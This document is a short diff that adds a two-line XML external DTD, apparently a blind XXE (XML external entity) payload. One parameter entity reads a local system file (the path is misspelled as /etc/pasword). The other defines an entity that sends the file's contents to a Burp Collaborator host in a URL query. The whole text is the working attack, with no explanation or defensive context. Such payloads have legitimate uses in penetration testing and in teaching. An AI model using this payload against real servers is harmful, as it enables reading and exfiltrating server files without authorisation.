@@ -1,0 +1,2 @@
+<!ENTITY % stuff SYSTEM "file:///etc/pasword">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://nyp2pogio79t5sp2zep3nmk40v6oud.burpcollaborator.net/?data=%stuff;'>">
